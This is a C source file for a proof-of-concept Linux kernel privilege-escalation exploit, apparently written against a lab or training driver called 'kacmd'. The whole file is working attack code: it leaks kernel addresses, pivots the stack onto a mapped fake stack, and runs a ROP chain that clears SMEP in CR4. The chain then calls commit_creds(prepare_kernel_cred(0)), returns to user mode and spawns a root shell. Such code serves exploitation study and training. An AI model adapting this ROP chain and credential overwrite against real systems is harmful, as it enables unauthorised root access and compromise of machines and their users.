/* POC to exploit arbitrary read and
 * a kernel fptr overwrite, ROP to user code
 * to disable SMEP
 * to gain local priv esc.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/types.h>

#include <sys/mman.h>


#include <kacmd.h>
#include <exp_commons.h>

#define KERNEL_CREDS 0xab7a0
#define COMMIT_CREDS 0xab3f0

// stack pivot
#define MOV_ESP 0x76167b
#define ESP_VAL 0x5d000004
//#define MOV_ESP 0xc5f346
//#define ESP_VAL 0x73620a6b
 
#define POP_RDI 0x76ddd
#define PUSH_RAX 0x36f65
//#define PUSH_RAX_RSI 0x100c8ec
#define PUSH_RAX_RDX 0x59ee1c
#define SWAPGS_RBP 0x67894
#define IRETQ 0x34b4b
#define POP_RSI 0x3a744
#define POP_RDX 0xda192

//disable smep
#define CR4_VALUE 0x6f0
#define WRITE_CR4 0x677d0
#define CR4_MASK 0xffffffffffcfffff

#pragma pack(push, 1)
#define DISABLE_SMEP
#ifdef DISABLE_SMEP
    struct rop_chain {
        unsigned long pop_rdi;
        unsigned long cr4;
        unsigned long write_cr4;
        void (*elevate_priv)(void);
        
        unsigned long swapgs;
        unsigned long junk;
        unsigned long iret;
        unsigned long shell;
        unsigned long cs;
        unsigned long rflags;
        unsigned long rsp;
        unsigned long ss;
    };
#else
// no smap disable
    struct rop_chain {
        unsigned long pop_rdi0;
        unsigned long rdi;
        unsigned long prep_creds;
        unsigned long pop_rdx;
        unsigned long rdx; // going to point to pop rdi
        unsigned long push_rax_rdx;
        //unsigned long pop_rdi1;
        unsigned long commit_creds;
        unsigned long swapgs;
        unsigned long junk;
        unsigned long iret;
        unsigned long shell;
        unsigned long cs;
        unsigned long rflags;
        unsigned long rsp;
        unsigned long ss;
    };
#endif
#pragma pack(pop)

void spawn_shell(void){
    printf("[I] opening shell\n");
    system("/bin/sh");

    fini();
    exit(0);
}

// stolen from https://www.slideshare.net/VitalyNikolenko/linux-smep-bypass-techniques
unsigned long user_cs;
unsigned long user_ss;
unsigned long user_rflags;
static void save_state() {
        asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_rflags) : : "memory");
}

#ifdef DISABLE_SMEP
unsigned long KERNEL_BASE;

// copied from https://github.com/xairy/kernel-exploits/blob/master/CVE-2017-7308/poc.c
typedef unsigned long __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

void get_root_payload(void) {
	((_commit_creds)(KERNEL_BASE + COMMIT_CREDS))(
		((_prepare_kernel_cred)(KERNEL_BASE + KERNEL_CREDS))(0)
	);
}
#endif
int main(){
    struct kacmd_info_params kip;
    struct kacmd_info_resp kir;
    struct kacmd_call_params kcp;
    struct rop_chain *ropc;
    unsigned long base;
    unsigned int size = sizeof(struct kacmd_sbof_params)+sizeof(struct rop_chain);
    char * mmap_page;
    void * kernel_stack;
    
    init();

    kip.cmd = KACMD_INFO;
    write_dev(cmd, (char*)&kip, sizeof(kip), 0);
    read_dev(cmd, (char*)&kir, sizeof(kir), 0);
    printf("[I] Vpg: %p Ppg: %p Epg: %p\n", kir.pg_vaddress, kir.pg_paddress, kir.exec_paddress);
    printf("[I] code: %p data: %p bss: %p\n", kir.kernel_code, kir.kernel_data, kir.kernel_bss);
    printf("[I] cr4: %lx masked: %lx\n", kir.cr4, kir.cr4 & CR4_MASK);
    
    // mmap page
    kernel_stack = (void*)((ESP_VAL-0xd000) & 0xfffffffffffff000);
    printf("[I] Trying to create fake stack at %p\n", kernel_stack);
    mmap_page = (char*)mmap(kernel_stack, 0xf000, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_FIXED| MAP_GROWSDOWN | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if (mmap_page != kernel_stack)
    {
        fprintf(stderr, "[E] Failed to mmap fake stack page: %p\n", mmap_page);
        perror("[E] Error: ");
        exit(1);
    }

    base = (unsigned long)kir.kernel_code;
    save_state();
    ropc = (struct rop_chain*)ESP_VAL;
#ifdef DISABLE_SMEP
	KERNEL_BASE = kir.kernel_code;
    ropc->pop_rdi = base + POP_RDI;
    ropc->cr4 = kir.cr4 & CR4_MASK;
    ropc->write_cr4 = base + WRITE_CR4;
    ropc->elevate_priv = &get_root_payload;
#else
    ropc->pop_rdi0 = base + POP_RDI;
    ropc->rdi = 0;
    ropc->prep_creds = base + KERNEL_CREDS;
    ropc->pop_rdx = base + POP_RDX;
    ropc->rdx = base + POP_RDI;
    ropc->push_rax_rdx = base + PUSH_RAX_RDX;
    //ropc->pop_rdi1 = base + POP_RDI;
    ropc->commit_creds = base + COMMIT_CREDS;
#endif
    ropc->swapgs = base + SWAPGS_RBP;
    ropc->junk = 0x4242424242424242;
    ropc->iret = base + IRETQ;
    ropc->shell = (unsigned long)&spawn_shell;
    ropc->cs = user_cs;
    ropc->rflags = user_rflags;
    ropc->rsp = (unsigned long)&base;
    ropc->ss = user_ss;

    kcp.address = (void*)(base + MOV_ESP);
    kcp.cmd = KACMD_CALL_SIMPLE;

    write_dev(cmd, (char*)&kcp, size, 0);

#ifdef DISABLE_SMEP
    spawn_shell();
#endif
    fini();
}
